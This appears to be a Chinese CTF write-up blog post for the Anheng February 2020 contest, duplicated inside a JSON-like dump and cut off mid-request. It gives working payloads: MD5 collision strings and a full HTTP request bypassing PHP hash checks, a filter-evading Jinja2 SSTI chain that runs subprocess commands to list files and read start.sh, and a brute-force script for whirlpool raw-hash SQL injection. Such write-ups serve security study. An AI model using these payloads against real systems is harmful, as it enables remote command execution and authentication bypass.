http://183.129.189.60:10004/?val1=s878926199a&val2=s155964671a&val3=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&val4=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&val5=%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7%9C%3F%0E%F7%8E%AD%4B%5D%12%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%7B%F9%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%CA%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%9D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%2C%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%C3%0F%93%72%5C&val6=%39%98%EB%F3%ED%EC%0F%45%C0%89%DD%13%77%E0%88%34%41%BF%20%0B%2B%1B%D8%D0%40%5A%7A%6E%52%92%AF%C8%5B%FD%E4%F5%E2%2A%EA%FC%CB%25%63%59%98%7B%78%54%24%A1%35%20%A5%2A%D6%22%35%04%B2%74%01%03%9E%F7%08%01%88%BA%03%88%01%09%65%96%5D%D2%A6%A2%3B%FF%AF%97%3D%88%50%1C%13%DA%49%B3%20%00%3A%60%88%E7%D7%B3%28%58%AF%04%6C%FC%F5%FE%0D%93%42%70%00%BD%EA%CE%D1%14%B4%B1%8E%47%8D%AD%2E%E5%2D%64%1D%3A&val7=%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7%9C%3F%0E%F7%8E%AD%4B%5D%92%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%FB%F8%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%4A%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%1D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%AC%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%43%0F%93%72%5C&m[]=8c8d357b5e872bbacd45197626bd5759&n[]=523af537946b79c4f8369ed39ba78605\nUpgrade-Insecure-Requests: 1\n\nval5=%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&val6=%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A&val7=%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&a=byGcY&b=aOtm2\n```\n\n即可拿到flag\n\n[参考链接]([http://www.gtfly.top/2019/04/07/%E6%8E%98%E5%AE%89%E6%9D%AFwp.html#audit](http://www.gtfly.top/2019/04/07/掘安杯wp.html#audit))\n\n\n\n\n\n\n\n# easyflask1\n\n给出提示，应该是ssti\n\n在404页面注入\n\n![](/pic/123.png)\n\n经过测试过滤了`-`,`.`。\n\n参考链接https://fireshellsecurity.team/asisctf-fort-knox\n\n操作\n\n```\n''.__class__.__mro__[1].__subclasses__()['''找到warnings.catch_warnings'''].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('ls')\n```\n\n114师傅的payload\n\n```\n##payload不需要这么长，可以连续格式化字符串，也可以只把_和.用格式化字符串替代\n#没找到flag，先看目录，发现start.sh可读\n{{''['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['mro']()[1]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](115)+'{0:c}'['format'](117)+'{0:c}'['format'](98)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](101)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]()[65]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](105)+'{0:c}'['format'](110)+'{0:c}'['format'](105)+'{0:c}'['format'](116)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](103)+'{0:c}'['format'](108)+'{0:c}'['format'](111)+'{0:c}'['format'](98)+'{0:c}'['format'](97)+'{0:c}'['format'](108)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](98)+'{0:c}'['format'](117)+'{0:c}'['format'](105)+'{0:c}'['format'](108)+'{0:c}'['format'](116)+'{0:c}'['format'](105)+'{0:c}'['format'](110)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](105)+'{0:c}'['format'](109)+'{0:c}'['format'](112)+'{0:c}'['format'](111)+'{0:c}'['format'](114)+'{0:c}'['format'](116)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]('subprocess')['check'+'{0:c}'['format'](95)+'output'](['ls','/'])}}\n#读取start.sh中存在sed -i \"s/1ad0633b78d14695b04f105c14674b0d4/$1/g\" /flag\\n\n{{''['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['mro']()[1]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](115)+'{0:c}'['format'](117)+'{0:c}'['format'](98)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](101)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]()[231]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](105)+'{0:c}'['format'](110)+'{0:c}'['format'](105)+'{0:c}'['format'](116)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](103)+'{0:c}'['format'](108)+'{0:c}'['format'](111)+'{0:c}'['format'](98)+'{0:c}'['format'](97)+'{0:c}'['format'](108)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](98)+'{0:c}'['format'](117)+'{0:c}'['format'](105)+'{0:c}'['format'](108)+'{0:c}'['format'](116)+'{0:c}'['format'](105)+'{0:c}'['format'](110)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](105)+'{0:c}'['format'](109)+'{0:c}'['format'](112)+'{0:c}'['format'](111)+'{0:c}'['format'](114)+'{0:c}'['format'](116)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]('subprocess')['check'+'{0:c}'['format'](95)+'output'](['cat','/start'+'{0:c}'['format'](46)+'sh'])}}\n```\n\n\n\n\n\n# HashIsTrue\n\n给了提示\n\n```\n注意如下题目内容：$pw = hash(\"whirlpool\",$pass,true); $sql = \"select * from user where username='$user' and password='$pw'\";\n```\n\n hash(\"whirlpool\",$pass,true)当hash函数开启true时，会返回字符串，而不是16进制。\n\n可以制造MD5后的包含‘= ’ (没有想通)\n\n编写脚本参考着114师傅\n\n```\n<?php\nfor($i=0;;$i++)\n{\n    $pass=$i;\n    $pw = hash(\"whirlpool\",$pass,true);\n    if(preg_match('/\\'=\\'/',$pw ))\n    {\n        echo $i;\n        echo urldecode('%09');\n        echo $pw;\n        echo urldecode('%0a');\n    }\n}\n?>\n```\n\n","source":"_posts/安恒月赛20200226.md","raw":"---\ntitle: 安恒月赛20200226\ndate: 2020-02-26 13:49:48\ntags:\n---\n\n# easy-hash\n\n打开题目就是源码\n\n<!--more-->\n\n```\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$val1 = @$_GET['val1'];\n$val2 = @$_GET['val2'];\n$val3 = @$_GET['val3'];\n$val4 = @$_GET['val4'];\n$val5 = (string)@$_POST['val5'];\n$val6 = (string)@$_POST['val6'];\n$val7 = (string)@$_POST['val7'];\nif( $val1 == $val2 ){\n    die('val1 OR val2 no no no');\n}\nif( md5($val1) != md5($val2) ){\n    die('step 1 fail');\n}\nif( $val3 == $val4 ){\n    die('val3 OR val4 no no no');\n}\nif ( md5($val3) !== md5($val4)){\n    die('step 2 fail');\n}\nif( $val5 == $val6 || $val5 == $val7 || $val6 == $val7 ){\n    die('val5 OR val6 OR val7 no no no');\n}\nif (md5($val5) !== md5($val6) || md5($val6) !== md5($val7) || md5($val5) !== md5($val7)){\n    die('step 3 fail');\n}\n\nif(!($_POST['a']) and !($_POST['b']))\n{\n    echo \"come on!\";\n    die();\n}\n$a = $_POST['a'];\n$b = $_POST['b'];\n$m = $_GET['m'];\n$n = $_GET['n'];\n\nif (!(ctype_alnum($a)) || (strlen($a) > 5)  || !(ctype_alnum($b)) || (strlen($b) > 6))    ////判断是否是字母和数字或字母数字的组合\n{\n    echo \"a OR b fail!\";\n    die();\n}\n\nif ((strlen($m) > 1) || (strlen($n) > 1))\n{\n    echo \"m OR n fail\";\n    die();\n}\n\n$val8 = md5($a);\n$val9 = strtr(md5($b), $m, $n);  //将MD5后包含$m的内容替换为$n\n\necho PHP_EOL;\necho \"<p>val8 : $val8</p>\";\necho PHP_EOL;\necho \"<p>val9 : $val9</p>\";\necho PHP_EOL;\nif (($val8 == $val9) && !($a === $b) && (strlen($b) === 5))\n{\n    echo \"nice,good job,give you flag:\";\n    echo file_get_contents('/var/www/html/flag.php');\n} val1 OR val2 no no no\n```\n\n显然的MD5碰撞\n\n生成的四组不同字符相同MD5\n\n```\n%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A\n\n%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A\n\n%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A\n\n%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A\n```\n\n发包\n\n```\nPOST /?val1=s878926199a&val2=s155964671a&val3=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&val4=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&m=a&n=1 HTTP/1.1\nHost: 183.129.189.60:10004\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 2337\nOrigin: http://183.129.189.60:10004\nConnection: close\nReferer: http://183.129.189.60:10004/?val1=s878926199a&val2=s155964671a&val3=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&val4=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&val5=%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7%9C%3F%0E%F7%8E%AD%4B%5D%12%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%7B%F9%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%CA%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%9D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%2C%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%C3%0F%93%72%5C&val6=%39%98%EB%F3%ED%EC%0F%45%C0%89%DD%13%77%E0%88%34%41%BF%20%0B%2B%1B%D8%D0%40%5A%7A%6E%52%92%AF%C8%5B%FD%E4%F5%E2%2A%EA%FC%CB%25%63%59%98%7B%78%54%24%A1%35%20%A5%2A%D6%22%35%04%B2%74%01%03%9E%F7%08%01%88%BA%03%88%01%09%65%96%5D%D2%A6%A2%3B%FF%AF%97%3D%88%50%1C%13%DA%49%B3%20%00%3A%60%88%E7%D7%B3%28%58%AF%04%6C%FC%F5%FE%0D%93%42%70%00%BD%EA%CE%D1%14%B4%B1%8E%47%8D%AD%2E%E5%2D%64%1D%3A&val7=%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7%9C%3F%0E%F7%8E%AD%4B%5D%92%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%FB%F8%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%4A%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%1D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%AC%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%43%0F%93%72%5C&m[]=8c8d357b5e872bbacd45197626bd5759&n[]=523af537946b79c4f8369ed39ba78605\nUpgrade-Insecure-Requests: 1\n\nval5=%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&val6=%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%